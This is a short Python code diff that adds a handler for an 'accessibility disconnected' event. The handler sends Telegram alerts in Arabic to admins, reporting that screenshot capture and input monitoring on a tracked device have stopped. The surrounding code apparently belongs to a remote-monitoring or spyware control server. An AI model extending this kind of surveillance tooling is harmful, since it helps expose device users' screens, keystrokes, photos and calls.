@@ -1850,6 +1850,23 @@ def _sock_file_explorer(data):
                 except Exception as e:
                     logger.error(f"فشل إرسال إشعار accessibility: {e}")
         return
+
+    # ✅ Check for accessibility_disconnected event (user disabled it)
+    if data_type == "accessibility_disconnected":
+        logger.info(f"⚠️ Accessibility disconnected on #{dev.get('short_id', '?')}")
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>⚠️ تم إلغاء إمكانية الوصول!</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"🚫 لقطات الشاشة ومراقبة الإدخال معطلة\n\n"
+                        f"💡 الميزات العادية (صور، فيديو، اتصال) قد تعمل إذا كان التطبيق مفتوحاً",
+                        parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار إلغاء accessibility: {e}")
+        return
     
     cmd = data.get("command", "?")
     status = data.get("status", "?")
